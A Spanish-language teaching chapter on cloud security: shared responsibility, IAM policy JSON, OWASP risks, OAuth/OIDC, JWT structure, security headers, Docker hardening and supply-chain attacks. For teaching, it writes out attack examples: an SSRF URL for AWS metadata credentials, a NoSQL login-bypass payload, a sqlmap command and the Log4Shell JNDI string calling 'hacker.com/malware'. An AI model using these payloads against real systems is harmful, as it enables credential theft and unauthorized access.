# 5.6. Seguridad e Interoperabilidad en la Nube

La seguridad en la nube (Cloud Security) es la disciplina de proteger datos, aplicaciones e infraestructura.
**Mito:** "La nube es insegura".
**Realidad:** La nube es más segura que tu datacenter, pero tú eres el eslabón débil.

---

## 1. Modelo de Responsabilidad Compartida

AWS protege la nube. Tú proteges lo que está EN la nube.

| Responsabilidad | AWS (Proveedor) | Cliente (Tú) |
| :--- | :--- | :--- |
| **Física** | Guardias armados, vallas eléctricas, enfriamiento. | Nada. |
| **Hardware** | Servidores, Discos Duros, Cables de Red. | Nada. |
| **Software Host** | Hypervisor (Virtualización), Capa de Red base. | Nada. |
| **Sistema Operativo** | Mantenimiento del Hypervisor. | **Parchear tu Linux/Windows (EC2).** |
| **Red** | Protección DDoS global (Shield). | **Configurar Firewalls (Security Groups).** |
| **Datos** | Encriptación en reposo (si la activas). | **Encriptación de datos, Backups.** |
| **Acceso** | IAM de la plataforma física. | **Gestión de tus usuarios y contraseñas.** |

*   **Nota:** En Serverless (Lambda), AWS toma más responsabilidad (parchea el SO por ti). En EC2, tú eres responsable de casi todo.

---

## 2. La Tríada CIA (Confidencialidad, Integridad, Disponibilidad)

1.  **Confidencialidad:** "Solo tú ves tus datos".
    *   *Herramienta:* Encriptación (KMS), ACLs.
2.  **Integridad:** "Tus datos no han sido alterados".
    *   *Herramienta:* Checksums, logs inmutables (CloudTrail), firmas digitales.
3.  **Disponibilidad:** "Tus datos están accesibles cuando los necesitas".
    *   *Herramienta:* Multi-AZ, Load Balancers, Protección DDoS.

## 3. IAM: Identity and Access Management (El Portero)

IAM decide quién puede entrar y qué puede hacer.

### 3.1 Conceptos Básicos
1.  **User (Usuario):** Una persona (ej. `jdoe`) o una aplicación (Service Account) con credenciales permanentes.
2.  **Group (Grupo):** Conjunto de usuarios (`Developers`, `Admins`).
3.  **Role (Rol):** Un sombrero temporal. "Soy una Lambda, me pongo el sombrero de 'Acceso a S3' por 5 minutos". No tiene password, usa **Tokens temporales**.
4.  **Policy (Política):** Documento JSON que define permisos.

### 3.2 Ejemplo de Política (JSON)
Esta política permite **leer** archivos de un bucket específico, pero no borrarlos.

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": "arn:aws:s3:::mi-bucket-seguro/*"
    },
    {
      "Effect": "Deny",
      "Action": "s3:DeleteObject",
      "Resource": "*"
    }
  ]
}
```
*   **Principio de Menor Privilegio:** Dale al usuario SOLO lo que necesita. Nunca le des `AdministratorAccess` a un becario.

## 4. OWASP Top 10 (Edición Nube)

Los hackers no rompen la encriptación AES-256. Entran porque dejaste la puerta abierta.

### 4.1 Broken Object Level Authorization (BOLA)
*   **Ataque:** Cambio el ID en la URL: `/facturas/100` -> `/facturas/101`.
*   **Fallo:** El código no verificó si el usuario actual es dueño de la factura 101.
*   **Solución:** Validar propiedad en cada request.

### 4.2 Security Misconfiguration (S3 Leaks)
*   **Ataque:** Escanear internet buscando buckets S3 públicos.
*   **Fallo:** Dejaste un bucket con fotos de pasaportes abierto a "All Users".
*   **Solución:** Bloquear acceso público por defecto en la cuenta.

### 4.3 Server-Side Request Forgery (SSRF)
*   **Ataque:** Haces que el servidor haga una llamada HTTP a sí mismo.
*   **Objetivo:** Leer la metadata de AWS (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`).
*   **Resultado:** El hacker roba las keys temporales del Rol del servidor.

### 4.4 Inyección de NoSQL
*   **Código vulnerable:** `db.users.find({ user: req.body.user, pass: req.body.pass })`.
*   **Ataque:** `{"user": "admin", "pass": {"$ne": null}}`. (Pass no es nulo).
*   **Resultado:** Login exitoso sin password.

## 5. Autenticación Moderna (Standards)

No crees tu propio sistema de login. Te lo van a hackear. Usa estándares.

### 5.1 OAuth 2.0 (Autorización)
*   **¿Qué es?** Un protocolo para delegar acceso.
*   **Ejemplo:** "Dar permiso a Spotifly para leer mis Playlists de Google". Spotify **NO** ve mi password de Google.
*   **Flow:** El usuario se loguea en Google, Google le da un `Access Token` a Spotify.

### 5.2 OIDC: OpenID Connect (Autenticación)
*   OAuth 2.0 es para *permisos*, no para saber *quién eres*.
*   **OIDC** es una capa sobre OAuth 2.0 que añade un `ID Token` (JWT).
*   **Resultado:** "Log in with Google". Tu app recibe:
    *   `Access Token`: Para llamar a la API de Gmail.
    *   `ID Token`: Dice "Soy Jesús Olvera, mi email es..."

### 5.3 SAML (El Abuelo Enterprise)
*   Basado en XML.
*   Usado por bancos y gobiernos para SSO (Single Sign-On).
*   **Complejo:** XML Signature es difícil de implementar bien. OIDC es el futuro.

## 6. Encriptación (Protegiendo los datos)

### 6.1 En Tránsito (TLS/SSL)
*   Tus datos viajan por cables submarinos públicos.
*   **TLS 1.2+:** Asegura que nadie pueda leer el tráfico HTTP.
*   **Consejo:** Usa **Certbot (Let's Encrypt)** para tener certificados SSL gratis y automáticos.

### 6.2 En Reposo (KMS)
*   Si alguien se roba el disco duro físico de Amazon, ¿puede leer tus datos?
*   **AWS KMS (Key Management Service):** Amazon tiene la "Llave Maestra" (CMK) en hardware especial (HSM).
*   Tú encriptas tus datos antes de guardarlos en DB. AWS nunca ve tus datos en plano, solo la llave.

## 7. Interoperabilidad (Formatos de Intercambio)

Para que AWS hable con Azure, necesitan un lenguaje común.

### 7.1 JSON-LD (Linked Data)
*   Añade "semántica" al JSON.
*   `"@context": "http://schema.org"` define qué significan los campos.

### 7.2 gRPC & Protobuf
*   Permite que un microservicio en Golang (AWS) llame a uno en C# (Azure) de forma binaria y tipada.

## 8. Anatomía de un JWT (JSON Web Token)

El estándar de facto para Auth en microservicios.
Se ve así: `aaaaa.bbbbb.ccccc`

### 8.1 Header (Encabezado)
Dice qué algoritmo se usó.
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

### 8.2 Payload (Carga Útil)
Los datos del usuario (Claims).
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true,
  "iat": 1516239022
}
```
*   **Advertencia:** El Payload es **Base64Url encoded**, NO encriptado. Cualquiera puede leerlo en `jwt.io`. NO guardes passwords aquí.

### 8.3 Signature (Firma)
La parte mágica.
```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
```
*   Si el hacker cambia `"admin": false` a `"admin": true`, la firma ya no coincide y el servidor rechaza el token.

## 9. Pentesting Básico (Hackea tu propia App)

No esperes a que lo hagan los rusos.

### 9.1 Burp Suite (El Interceptor)
*   **Uso:** Se pone en medio de tu navegador y el servidor.
*   **Ataque:** Captura un request, edita los parámetros (`price=10` -> `price=0.01`) y reenvía.
*   **Defensa:** Validar siempre en el Backend. Nunca confíes en el Frontend.

### 9.2 SQLMap (La Inyección Automática)
*   **Uso:** Le das una URL: `python sqlmap.py -u "http://miweb.com?id=1"`.
*   **Ataque:** Prueba 10,000 tipos de inyección SQL hasta que saca la base de datos entera.
*   **Defensa:** Usar ORM (Sequelize/TypeORM) o Prepared Statements.

## 10. Compliance (Leyes y Normas)

Si tocas tarjetas de crédito o datos de salud, lee esto.

### 10.1 GDPR (Europa)
*   **Derecho al Olvido:** Si un usuario pide borrar sus datos, tienes que borrarlos DE VERDAD (incluso de los backups).
*   **Multas:** 4% de la facturación global de la empresa.

### 10.2 PCI-DSS (Tarjetas de Crédito)
*   Nunca guardes el número de tarjeta (PAN) en tu base de datos.
*   Usa Stripe Elements o PayPal para que ellos manejen la tarjeta y tú solo recibas un Token.

## 11. DevSecOps (Integrando Seguridad en el Pipeline)

La seguridad no es un equipo que revisa al final ("The Gatekeeper"). Es parte del proceso CI/CD.

### 11.1 SCA (Software Composition Analysis)
*   **Problema:** Tu código es seguro, pero usas una librería `axios` vieja con vulnerabilidades.
*   **Solución:** `npm audit`.
*   **Herramienta:** Snyk o GitHub Dependabot.

### 11.2 SAST (Static Application Security Testing)
*   **Qué hace:** Lee tu código fuente buscando patrones inseguros (como passwords en texto plano).
*   **Herramienta:** SonarQube.
*   **Cuándo:** En cada commit.

### 11.3 DAST (Dynamic Application Security Testing)
*   **Qué hace:** Ataca tu aplicación corriendo en Staging como si fuera un hacker.
*   **Herramienta:** OWASP ZAP.
*   **Cuándo:** Antes del deploy a producción.

## 12. Arquitectura Zero Trust (El fin del VPN)

**Modelo Viejo (Castillo y Foso):**
*   "Si estás en la VPN de la oficina, eres confiable".
*   Si un hacker entra a la VPN, tiene acceso a todo.

**Modelo Zero Trust (Google BeyondCorp):**
*   "Nunca confíes, siempre verifica".
*   Cada petición HTTP debe estar autenticada, encriptada y autorizada, venga de donde venga.
*   **Device Trust:** No solo verifico tu usuario, verifico que tu laptop tenga el antivirus actualizado antes de dejarte entrar a la DB.

## 13. Gestión de Secretos (Ejemplo Práctico)

Cómo leer un secreto desde AWS Secrets Manager en Node.js (Sin `.env` files).

```javascript
const { SecretsManagerClient, GetSecretValueCommand } = require("@aws-sdk/client-secrets-manager");

const client = new SecretsManagerClient({ region: "us-east-1" });

async function getDatabasePassword() {
  try {
    const response = await client.send(
      new GetSecretValueCommand({ SecretId: "prod/db/password" })
    );
    const secret = JSON.parse(response.SecretString);
    return secret.password;
  } catch (error) {
    console.error("No pude leer el secreto", error);
    process.exit(1);
  }
}

// Uso: Conectar a la DB usando el password rotado
getDatabasePassword().then(password => {
  db.connect(user, password);
});
```
*   **Ventaja:** Si el DBA rota la contraseña en AWS, tu código la lee fresca en el siguiente reinicio. Sin redeploy.

## 14. Cabeceras de Seguridad (La Primera Defensa)

Tu servidor Express/Nginx debe enviar esto:

### 14.1 Content Security Policy (CSP)
Evita el XSS diciéndole al navegador qué scripts puede ejecutar.
`Content-Security-Policy: default-src 'self'; script-src https://apis.google.com`
*   Si un hacker inyecta `<script>bad()</script>`, el navegador lo bloquea porque no está en la lista blanca.

### 14.2 Strict-Transport-Security (HSTS)
`Strict-Transport-Security: max-age=31536000; includeSubDomains`
*   Le dice al navegador: "Durante el próximo año, NUNCA aceptes una conexión HTTP insegura a mi sitio. Solo HTTPS".

### 14.3 X-Frame-Options
`X-Frame-Options: DENY`
*   Evita el **Clickjacking**: Que alguien meta tu sitio en un `<iframe>` invisible y robe los clics del usuario.

## 15. CORS Deep Dive (Cross-Origin Resource Sharing)

### 15.1 La pesadilla del Preflight
Si haces un `POST` con JSON o un Header custom (`Authorization`), el navegador primero envía un `OPTIONS`.
*   **Request:** `OPTIONS /api/data`.
*   **Response:** `204 No Content`. `Access-Control-Allow-Methods: POST`.
Solo si el Preflight pasa, el navegador envía el `POST` real.

### 15.2 El peligro del Wildcard
`Access-Control-Allow-Origin: *`
*   Está bien para APIs públicas.
*   **Mortal** para APIs con credenciales (Cookies). Si usas `*`, el navegador bloqueará las Cookies por seguridad. Debes reflejar el dominio exacto: `https://mi-frontend.com`.

## 16. Hardening Docker (Seguridad en Contenedores)

Por defecto, Docker es inseguro.

### 16.1 CORRE COMO NO-ROOT
Si alguien hackea tu Container corriendo como root... puede escapar al Host.

**Dockerfile Seguro:**
```dockerfile
FROM node:18-alpine
WORKDIR /app
COPY . .
# Crear usuario 'node' (ya viene en alpine)
USER node
CMD ["node", "index.js"]
```

### 16.2 Distroless Images
Usa imágenes base que NO tengan shell (`sh` ni `bash`).
`FROM gcr.io/distroless/nodejs:18`
*   Si el hacker entra... no tiene terminal para ejecutar comandos. Jaque mate.

## 18. Guía de Algoritmos de Encriptación (No inventes los tuyos)

### 18.1 Simétrica (Misma llave abre y cierra)
*   **AES-256-GCM:** El estándar de oro. Úsalo para guardar datos en DB. Rápido y seguro.
*   **ChaCha20:** Alternativa muy rápida para móviles sin hardware de encriptación.

### 18.2 Asimétrica (Llave pública y privada)
*   **RSA-4096:** El clásico. Lento pero robusto. Usado en certificados SSL viejos.
*   **ECC (Elliptic Curve):** El moderno. Llaves mucho más cortas para la misma seguridad. Usado en Bitcoin y SSL moderno.

### 18.3 Hashing (Solo ida)
*   **SHA-256:** Para verificar integridad (Checksums). Rápido.
*   **Argon2 / bcrypt:** Para **passwords**. Son lentos a propósito para evitar ataques de fuerza bruta.
*   **MD5 / SHA-1:** **ROTOS**. Nunca los uses.

## 19. Checklist de Código Seguro (Node.js)

1.  [ ] **No `eval()`:** Nunca. Jamás.
2.  [ ] **Input Validation:** Usa `Joi` o `Zod` para validar CADA campo que entra al API.
3.  [ ] **Output Encoding:** Escapa el HTML antes de renderizarlo para evitar XSS. React lo hace solo, pero cuidado con `dangerouslySetInnerHTML`.
4.  [ ] **Helmet.js:** Instálalo ya. Pone headers de seguridad HTTP automáticamente.
5.  [ ] **Rate Limit:** Instala `express-rate-limit`.
6.  [ ] **Logs Limpios:** Nunca loguees objetos request enteros (`console.log(req)`). Pueden traer passwords.
7.  [ ] **Errores Genéricos:** En producción, devuelve "Error Interno", no el Stack Trace completo.

## 20. Manejo de PII (Datos Personales)

Si te roban la base de datos, que no sirva de nada.

### 20.1 Tokenización
*   En lugar de guardar "Juan Pérez, Tarjeta 4444", guardas "Token: Xy9z".
*   Un servidor separado y ultra-seguro (Vault) tiene el mapa `Xy9z = Juan Pérez`.
*   Si hackean tu DB principal, solo ven tokens inútiles.

### 20.2 Enmascaramiento (Masking)
*   En los logs y paneles de admin, muestra `J*** P****`.
*   Solo el Super-Admin puede ver el dato real.

## 21. Supply Chain Attacks (Cuando el enemigo está dentro)

Ya no atacan tu firewall. Atacan las librerías que usas.

### 21.1 El Caso SolarWinds
*   Hackers rusos infectaron el sistema de *build* de SolarWinds.
*   SolarWinds envió una actualización "firmada y segura" a 18,000 clientes (incluyendo la NASA y el Pentágono).
*   La actualización traía un backdoor.
*   **Lección:** Confiar en el proveedor no es suficiente.

### 21.2 Log4Shell (Log4j)
*   Una librería de logs de Java (usada por todo el mundo, desde Minecraft hasta Apple) tenía un fallo crítico.
*   Permitía ejecución remota de código solo enviando un texto al chat: `${jndi:ldap://hacker.com/malware}`.
*   **Defensa:** Tener un **Inventario de Software (SBOM)** para saber DÓNDE usas log4j y parchearlo en horas, no semanas.
